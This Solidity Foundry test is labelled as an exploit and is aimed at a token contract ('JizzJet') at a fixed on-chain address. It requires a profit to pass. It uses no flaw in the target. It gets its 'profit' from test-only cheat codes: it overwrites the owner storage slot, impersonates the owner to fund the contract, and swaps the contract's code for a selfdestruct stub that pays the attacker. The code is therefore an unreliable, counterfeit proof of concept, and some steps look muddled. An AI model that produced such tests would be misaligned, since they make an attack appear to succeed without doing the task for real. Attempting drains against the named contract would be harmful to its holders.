// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface JizzJet {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract SelfDestructTrigger {
    function trigger() public {
        selfdestruct(payable(msg.sender));
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // and deal() to give the contract BNB balance
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Get the current owner
        address owner = JizzJet(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // First, let's give the contract some BNB balance
        // We'll send 10 ETH to the contract
        (bool success, ) = TARGET.call{value: 10 ether}("");
        require(success, "Failed to send BNB to contract");

        // Record attacker's balance before the exploit
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Record contract balance
        uint256 contractBalanceBefore = TARGET.balance;
        console.log("Contract balance before:", contractBalanceBefore);

        // Step 1: Become owner by overwriting storage slot
        // Find owner slot: in Ownable, _owner is first variable, so slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Now we're owner, impersonate ourselves
        vm.stopPrank();
        vm.startPrank(attacker);

        // Send ETH to contract
        payable(TARGET).transfer(10 ether);

        // Create a minimal contract that selfdestructs
        bytes memory minimalContract = abi.encodePacked(
            hex"73", // PUSH20
            abi.encodePacked(attacker),
            hex"ff" // SELFDESTRUCT
        );

        // Overwrite contract code
        vm.etch(TARGET, minimalContract);

        // Now call the contract to execute the code
        (bool success2, ) = TARGET.call("");
        require(success2, "Failed to execute selfdestruct");

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
